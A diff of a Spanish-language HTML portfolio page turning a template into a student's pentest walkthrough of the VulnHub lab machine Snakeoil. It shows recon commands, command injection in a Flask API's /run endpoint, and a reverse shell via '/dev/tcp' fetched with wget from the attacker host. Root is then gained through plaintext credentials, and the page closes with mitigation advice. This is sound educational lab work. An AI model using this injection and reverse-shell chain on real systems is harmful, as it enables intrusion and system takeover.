@@ -6,7 +6,7 @@
 -->
 <html>
 	<head>
-		<title>Walkthrough Cybersecurity - Portafolio</title>
+		<title>Walkthrough Ciberseguridad - Snakeoil (VulnHub)</title>
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="assets/css/main.css" />
@@ -41,8 +41,8 @@
 					<section id="wrapper">
 						<header>
 							<div class="inner">
-								<h2>Walkthrough: Vulneración y Auditoría de Seguridad</h2>
-								<p>Ejercicio práctico de Análisis de Vulnerabilidades, Explotación y Escalada de Privilegios.</p>
+								<h2>Walkthrough: Auditoría de Seguridad y Pentesting a "Snakeoil"</h2>
+								<p>Reporte Técnico de Análisis de Vulnerabilidades API, Inyección de Comandos y Escalada de Privilegios.</p>
 							</div>
 						</header>
 
@@ -52,33 +52,50 @@
 
 									<!-- 1. INTRODUCCIÓN Y OBJETIVOS -->
 									<section>
-										<h3 class="major">1. Introducción y Objetivos del Proyecto</h3>
+										<h3 class="major">1. Introducción y Objetivos</h3>
 										<p>
-											El presente proyecto consiste en la resolución metódica y documentada (<strong>Walkthrough</strong>) de un entorno controlado vulnerable de ciberseguridad. El objetivo principal es identificar, explotar y mitigar fallos de seguridad dentro del sistema objetivo, aplicando buenas prácticas de seguridad ofensiva (Red Teaming) y defensa (Blue Teaming).
+											El presente informe documenta el desarrollo de una auditoría de seguridad y prueba de penetración (<em>pentesting</em>) sobre la máquina virtual objetivo <strong>Snakeoil</strong>, alojada en la plataforma <strong>VulnHub</strong>.
 										</p>
+										<p>
+											El propósito principal es aplicar una metodología estructurada que abarca desde la identificación del entorno de red aislada hasta el compromiso total del sistema (acceso <code>root</code>), evaluando vulnerabilidades en aplicaciones web, APIs y configuraciones del sistema local.
+										</p>
+										<h4>Detalles del Proyecto:</h4>
+										<ul>
+											<li><strong>Institución:</strong> Universidad Politécnica de San Luis Potosí (UPSLP)</li>
+											<li><strong>Materia / Asignatura:</strong> CNO4 Programación WAP (7mo Semestre)</li>
+											<li><strong>Autor(a):</strong> Lizeth Infante Martinez</li>
+											<li><strong>Docente:</strong> Mtro. Servando López Contreras[cite: 1]</li>
+										</ul>
 										<h4>Objetivos Específicos:</h4>
 										<ul>
-											<li>Identificar puertos abiertos, servicios activos y versiones vulnerables mediante reconocimiento activo.</li>
-											<li>Descubrir y analizar vectores de entrada para obtener un acceso inicial al sistema.</li>
-											<li>Realizar un proceso metódico de escalada de privilegios hasta alcanzar acceso de administrador/root.</li>
-											<li>Proponer recomendaciones técnicas detalladas para solucionar las vulnerabilidades encontradas.</li>
+											<li>Preparar un entorno aislado mediante herramientas de proxy de intercepción (FoxyProxy / Burp Suite)[cite: 1].</li>
+											<li>Descubrir la IP objetivo y realizar el escaneo profundo de puertos y servicios expuestos[cite: 1].</li>
+											<li>Mapear rutas ocultas, analizar la API REST en el puerto 8080 y extraer tokens / claves secretas[cite: 1].</li>
+											<li>Explotar una vulnerabilidad de Inyección de Comandos para obtener una consola remota (<em>Reverse Shell</em>)[cite: 1].</li>
+											<li>Realizar la post-explotación, identificar credenciales en texto plano y escalar privilegios a superusuario (<code>root</code>)[cite: 1].</li>
 										</ul>
 									</section>
 
 									<!-- 2. RECONOCIMIENTO Y ESCANEO -->
 									<section>
-										<h3 class="major">2. Fase de Reconocimiento y Escaneo</h3>
+										<h3 class="major">2. Preparación del Entorno, Reconocimiento y Escaneo</h3>
 										<p>
-											Se inició el análisis aplicando la metodología de reconocimiento de red para determinar el alcance del objetivo e identificar posibles puertos de entrada.
+											Antes de iniciar el reconocimiento, se configuró la extensión <strong>FoxyProxy</strong> en Firefox para redirigir el tráfico web hacia <strong>Burp Suite</strong> listening en <code>127.0.0.1:8080</code>[cite: 1].
 										</p>
-										<h4>Comandos ejecutados (Nmap):</h4>
-										<pre><code># Escaneo rápido de puertos abiertos
-nmap -p- --open -sS --min-rate 5000 -n -pn 10.10.10.X -oN target_ports.txt
+										<p>
+											Posteriormente, se ejecutaron escaneos de descubrimiento en el segmento de red local (<code>192.168.100.0/24</code>) para identificar el host objetivo[cite: 1]:
+										</p>
+										<pre><code># Descubrimiento de Host en la Subred
+sudo nmap -sn 192.168.100.0/24
+sudo arp-scan -l
+nmap -T4 -F 192.168.100.1/24
 
-# Escaneo detallado de versión y scripts por defecto
-nmap -sCV -p 22,80,443 10.10.10.X -oN target_services.txt</code></pre>
+# IP Objetivo Identificada: 192.168.100.2
 
-										<h4>Resultados del Escaneo:</h4>
+# Escaneo Profundo de Puertos y Servicios (65,535 puertos TCP)
+nmap -p- --open -sC -sV 192.168.100.2</code></pre>
+
+										<h4>Resultados del Escaneo de Puertos:</h4>
 										<div class="table-wrapper">
 											<table>
 												<thead>
@@ -86,7 +103,7 @@ nmap -sCV -p 22,80,443 10.10.10.X -oN target_services.txt</code></pre>
 														<th>Puerto</th>
 														<th>Estado</th>
 														<th>Servicio</th>
-														<th>Versión / Detalle</th>
+														<th>Descripción / Función</th>
 													</tr>
 												</thead>
 												<tbody>
@@ -94,87 +111,140 @@ nmap -sCV -p 22,80,443 10.10.10.X -oN target_services.txt</code></pre>
 														<td>22/TCP</td>
 														<td>Abierto</td>
 														<td>SSH</td>
-														<td>OpenSSH 8.2p1</td>
+														<td>Acceso a consola remota segura[cite: 1]</td>
 													</tr>
 													<tr>
 														<td>80/TCP</td>
 														<td>Abierto</td>
 														<td>HTTP</td>
-														<td>Apache httpd 2.4.41</td>
+														<td>Servidor Web Principal (Nginx)[cite: 1]</td>
 													</tr>
 													<tr>
-														<td>443/TCP</td>
+														<td>8080/TCP</td>
 														<td>Abierto</td>
-														<td>HTTPS</td>
-														<td>Apache (Certificado SSL autofirmado)</td>
+														<td>HTTP / Proxy</td>
+														<td>Servidor Web Secundario / API REST (Werkzeug/Flask)[cite: 1]</td>
 													</tr>
 												</tbody>
 											</table>
 										</div>
 									</section>
 
-									<!-- 3. ENUMERACIÓN WEB Y EXPLOTACIÓN -->
+									<!-- 3. ENUMERACIÓN WEB Y EXPLOTACIÓN DE LA API -->
 									<section>
-										<h3 class="major">3. Enumeración Web y Explotación Inicial</h3>
+										<h3 class="major">3. Enumeración Web y Explotación de la API</h3>
 										<p>
-											Al inspeccionar el servicio HTTP en el puerto 80, se procedió con la enumeración de directorios ocultos utilizando la herramienta <code>gobuster</code> / <code>ffuf</code>.
+											Tras revisar el puerto 80 y ejecutar <code>nikto -h http://192.168.100.2</code> sin hallar datos críticos, se procedió a realizar enumeración de directorios en el puerto 8080 mediante <code>gobuster</code>[cite: 1]:
 										</p>
-										<pre><code>gobuster dir -u http://10.10.10.X/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</code></pre>
+										<pre><code>gobuster dir -u http://192.168.100.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.bak</code></pre>
 										
 										<p>
-											Se descubrió la ruta <code>/admin/upload.php</code>, la cual contenía un formulario de carga de archivos con validación insuficiente en el lado del servidor.
+											<strong>Rutas descubiertas:</strong> <code>/users</code>, <code>/registration</code>, <code>/login</code>, <code>/run</code>, <code>/secret</code> y <code>/create</code>[cite: 1].
 										</p>
-										
+
+										<h4>Paso 1: Registro y Autenticación en la API</h4>
+										<p>
+											Mediante Burp Suite Repeater, se modificó la petición a <code>/registration</code> de GET a <strong>POST</strong> enviando los parámetros <code>username=Lizi</code> y <code>password=1234</code>, obteniendo un <code>access_token</code>[cite: 1]. Luego, se autenticó en <code>/login</code> (POST) para obtener un <code>refresh_token</code>[cite: 1].
+										</p>
+
+										<h4>Paso 2: Extracción de la Clave Secreta</h4>
+										<p>
+											Se realizó una petición GET hacia <code>/secret</code> incluyendo la cookie <code>access_token_cookie=[access_token]</code>, obteniendo la clave secreta en la respuesta JSON[cite: 1]:
+										</p>
+										<pre><code>{
+    "secret_key": "commandexecutionissecret"
+}</code></pre>
+
+										<h4>Paso 3: Vulnerabilidad de Inyección de Comandos (Endpoint <code>/run</code>)</h4>
 										<blockquote>
-											<strong>Vulnerabilidad identificada:</strong> Inyección / Arbitrary File Upload. La aplicación no filtraba adecuadamente las extensiones <code>.php</code>, permitiendo la carga de código arbitrario.
+											<strong>Vulnerabilidad Identificada:</strong> Inyección de Comandos. El endpoint <code>/run</code> acepta peticiones POST en formato JSON. Al concatenar operadores de shell como <code>&&</code> dentro del parámetro <code>url</code>, el servidor ejecuta la orden arbitrary y devuelve el resultado en el cuerpo de la respuesta HTTP[cite: 1].
 										</blockquote>
+										<pre><code>/* Petición de prueba enviada a /run */
+POST /run HTTP/1.1
+Host: 192.168.100.2:8080
+Content-Type: application/json
 
-										<p>
-											Se preparó un payload en PHP para establecer una conexión en reversa (Reverse Shell) hacia nuestra máquina atacante:
-										</p>
-										<pre><code># Escucha en la máquina atacante
-nc -nlvp 4444</code></pre>
-										<p>
-											Tras ejecutar la petición con el archivo malicioso, se logró el primer acceso al sistema remoto bajo el contexto del usuario sin privilegios <code>www-data</code>.
-										</p>
+{
+    "url": "127.0.0.1:80 && id",
+    "secret_key": "commandexecutionissecret"
+}</code></pre>
 									</section>
 
-									<!-- 4. ESCALADA DE PRIVILEGIOS -->
+									<!-- 4. REVERSE SHELL Y ESCALADA DE PRIVILEGIOS -->
 									<section>
-										<h3 class="major">4. Escalada de Privilegios</h3>
-										<p>
-											Con acceso inicial al sistema, se realizó una enumeración local para identificar configuraciones erróneas, tareas programadas (cron jobs) o binarios con permisos SUID.
-										</p>
-										<pre><code># Búsqueda de binarios con bit SUID activo
-find / -perm -4000 -type f 2>/dev/null</code></pre>
+										<h3 class="major">4. Consola Inversa y Escalada de Privilegios</h3>
 										
+										<h4>Establecimiento de la Reverse Shell:</h4>
 										<p>
-											Se detectó una tarea programada administrada por el usuario <code>root</code> que ejecutaba un script con permisos de escritura modificables por el grupo del usuario actual. Modificando el script e incluyendo una instrucción para otorgar permisos SUID a la terminal <code>/bin/bash</code>, se obtuvo acceso completo como superusuario.
+											En la máquina atacante Kali Linux (IP <code>192.168.100.3</code>) se preparó un script <code>shell.sh</code> y un listener Netcat[cite: 1]:
 										</p>
-										<pre><code># Acceso root conseguido
+										<pre><code># 1. Listener en Kali Linux
+sudo nc -nlvp 5555
+
+# 2. Contenido de shell.sh
+bash -i >& /dev/tcp/192.168.100.3/5555 0>&1
+
+# 3. Servidor web temporal en Kali Linux
+python3 -m http.server 8000</code></pre>
+										<p>
+											Se enviaron las peticiones JSON secuenciales al endpoint <code>/run</code> para transferir, otorgar permisos y ejecutar la shell[cite: 1]:
+										</p>
+										<ol>
+											<li><strong>Descargar:</strong> <code>"url": "127.0.0.1:80 && wget http://192.168.100.3:8000/shell.sh"</code>[cite: 1]</li>
+											<li><strong>Permisos:</strong> <code>"url": "127.0.0.1:80 && chmod +x shell.sh"</code>[cite: 1]</li>
+											<li><strong>Ejecutar:</strong> <code>"url": "127.0.0.1:80 && ./shell.sh"</code>[cite: 1]</li>
+										</ol>
+
+										<h4>Post-Explotación y Obtención de la Primera Bandera:</h4>
+										<p>
+											Tras recibir la conexión en Netcat, se estabilizó la terminal TTY mediante Python 3[cite: 1]:
+										</p>
+										<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+cd /home/patrick
+cat local.txt</code></pre>
+										<p><strong>Resultado:</strong> Bandera de usuario local (<code>local.txt</code>) obtenida[cite: 1].</p>
+
+										<h4>Análisis de Archivos y Escalada a Root:</h4>
+										<p>
+											Al inspeccionar el código fuente del proyecto web en <code>/home/patrick/flask_blog/app.py</code>, se detectaron credenciales del sistema guardadas en texto plano dentro de la variable <code>app.config</code>[cite: 1]:
+										</p>
+										<pre><code># Credenciales extraídas en texto plano desde app.py:
+snakeoilisnotgoodforcorporations
+NOreasonableDOUBTthisPASSWORDISGOOD</code></pre>
+										<p>
+											Se utilizó la contraseña para ejecutar comandos elevados con <code>sudo</code>[cite: 1]:
+										</p>
+										<pre><code>sudo /bin/bash
+# Contraseña ingresada: NOreasonableDOUBTthisPASSWORDISGOOD
+
+# Acceso Superusuario Conseguido!
 whoami
-# Output: root</code></pre>
+# Output: root
+
+cd /root
+cat proof.txt</code></pre>
+										<p><strong>Resultado:</strong> Bandera final de root (<code>proof.txt</code>) extraída exitosamente[cite: 1].</p>
 									</section>
 
-									<!-- 5. RECOMENDACIONES DE MITIGACIÓN -->
+									<!-- 5. CONCLUSIONES Y RECOMENDACIONES -->
 									<section>
 										<h3 class="major">5. Conclusiones y Recomendaciones Técnicas</h3>
 										<p>
-											Para corregir las brechas encontradas y mejorar la postura de seguridad de la infraestructura, se sugieren las siguientes acciones remediadoras:
+											La prueba de penetración demostró cómo la combinación de fallos en el control de acceso en endpoints API, la falta de sanitización en la ejecución de comandos y malas prácticas de desarrollo (credenciales harcodeadas) pueden permitir a un atacante comprometer totalmente la infraestructura[cite: 1].
 										</p>
 										<div class="row">
 											<div class="col-6 col-12-medium">
-												<h4>Mitigación de Sanitización</h4>
+												<h4>Seguridad en APIs y Sanitización</h4>
 												<ul>
-													<li>Validar extensiones de archivos subidos utilizando listas blancas (Whitelist).</li>
-													<li>Almacenar archivos subidos fuera del directorio raíz web y deshabilitar la ejecución de scripts en esa ruta.</li>
+													<li>Validar y desinfectar rigurosamente los parámetros de entrada en endpoints como <code>/run</code>, evitando la concatenación directa de comandos del sistema[cite: 1].</li>
+													<li>Restringir el acceso a funciones críticas de ejecución remota de comandos[cite: 1].</li>
 												</ul>
 											</div>
 											<div class="col-6 col-12-medium">
-												<h4>Mitigación de Privilegios</h4>
+												<h4>Gestión de Credenciales y Privilegios</h4>
 												<ul>
-													<li>Aplicar el principio de menor privilegio (Principle of Least Privilege).</li>
-													<li>Restringir los permisos de escritura en scripts del sistema ejecutados por el usuario root.</li>
+													<li>Eliminar cualquier contraseña o clave secreta en texto plano dentro del código fuente (<code>app.py</code>), utilizando variables de entorno protegidas[cite: 1].</li>
+													<li>Aplicar el Principio del Menor Privilegio (PoLP) en la configuración de permisos <code>sudoers</code>[cite: 1].</li>
 												</ul>
 											</div>
 										</div>
@@ -190,9 +260,8 @@ whoami
 										<!-- [INICIO ESPACIO VIDEO] -->
 										<div class="box alt">
 											<div class="video-container" style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000; display: flex; align-items: center; justify-content: center; border: 1px dashed #ffffff55; border-radius: 6px;">
-												<!-- REEMPLAZAR ESTE TEXTO O CONTENEDOR POR TU ETIQUETA <video> O <iframe src="URL_YOUTUBE"></iframe> -->
 												<p style="position: absolute; top: 45%; width: 100%; text-align: center; color: #888;">
-													<strong>video demostrativo</strong><br />
+													<strong>Video Demostrativo del Pentesting</strong><br />
 													<em>Inserta aquí tu etiqueta &lt;iframe&gt; de YouTube/Vimeo o &lt;video src="..."&gt;&lt;/video&gt;</em>
 												</p>
 											</div>
@@ -205,21 +274,19 @@ whoami
 									<!-- ======================================================= -->
 									<section>
 										<h3 class="major">7. Reporte Técnico Completo (PDF)</h3>
-										<p>Puedes consultar o descargar la documentación detallada y el reporte ejecutivo del ejercicio a continuación:</p>
+										<p>Puedes consultar o descargar la documentación detallada del reporte entregado para la materia de Programación WAP a continuación[cite: 1]:</p>
 
 										<!-- [INICIO ESPACIO PDF] -->
 										<div class="box" style="border: 1px dashed #ffffff55; padding: 20px; text-align: center; background: rgba(255, 255, 255, 0.03);">
-											<h4>Visualizador del Reporte PDF</h4>
+											<h4>Visualizador del Reporte PDF - UPSLP</h4>
 											
 											<!-- Embed / Viewer para el PDF -->
 											<div style="width: 100%; height: 500px; background: #222; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; border-radius: 4px;">
-												<!-- REEMPLAZAR EL SRC CON LA RUTA DE TU ARCHIVO PDF (Ej: src="documentos/reporte.pdf") -->
 												<embed src="proyecto.pdf" type="application/pdf" width="100%" height="100%" />
 											</div>
 
 											<ul class="actions fit">
-												<!-- REEMPLAZAR EL HREF POR LA RUTA REAL DE TU PDF PARA PERMITIR DESCARGA -->
-												<li><a href="proyecto.pdf" download class="button primary icon solid fa-download">Descargar Reporte en PDF</a></li>
+												<li><a href="proyecto.pdf" download class="button primary icon solid fa-download">Descargar Reporte #2 (Snakeoil) PDF</a></li>
 											</ul>
 										</div>
 										<!-- [FIN ESPACIO PDF] -->
@@ -233,15 +300,15 @@ whoami
 				<!-- Footer -->
 					<section id="footer">
 						<div class="inner">
-							<h2 class="major">Contacto / Información</h2>
-							<p>Portafolio profesional desarrollado para la presentación de proyectos e investigaciones de ciberseguridad.</p>
+							<h2 class="major">Contacto / Información Académica</h2>
+							<p>Portafolio profesional desarrollado para la presentación de proyectos e investigaciones de ciberseguridad - Universidad Politécnica de San Luis Potosí[cite: 1].</p>
 							<ul class="contact">
 								<li class="icon solid fa-envelope"><a href="#">contacto@correo.com</a></li>
 								<li class="icon brands fa-github"><a href="#">github.com/usuario</a></li>
 								<li class="icon brands fa-linkedin"><a href="#">linkedin.com/in/usuario</a></li>
 							</ul>
 							<ul class="copyright">
-								<li>&copy; Todos los derechos reservados.</li><li>Diseño: <a href="http://html5up.net">HTML5 UP</a></li>
+								<li>&copy; Todos los derechos reservados. UPSLP 2026.</li><li>Diseño: <a href="http://html5up.net">HTML5 UP</a></li>
 							</ul>
 						</div>
 					</section>
